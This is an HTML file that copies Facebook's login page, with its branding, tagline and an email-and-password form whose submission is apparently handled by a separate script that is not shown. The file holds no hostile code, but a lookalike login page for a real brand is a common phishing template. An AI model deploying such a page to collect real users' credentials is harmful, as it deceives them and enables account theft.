<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Facebook</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="left-section">
            <div class="logo">facebook</div>
            <div class="tagline">Connect with friends and the world around you on Facebook.</div>
        </div>
        
        <div class="right-section">
            <div class="login-box">
                <form id="loginForm">
                    <input type="email" id="email" placeholder="Email address or phone number" required>
                    <input type="password" id="password" placeholder="Password" required>
                    <button type="submit" class="login-btn">Log In</button>
                </form>
                
                <div class="forgot-password">
                    <a href="#forgot">Forgotten password?</a>
                </div>
                
                <div class="divider"></div>
                <button class="create-account-btn" onclick="alert('Create Account Page')">Create New Facebook Account</button>
            </div>
            
            <div class="page-info">
                <p><strong>Create a Page</strong> for a celebrity, brand or business.</p>
            </div>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
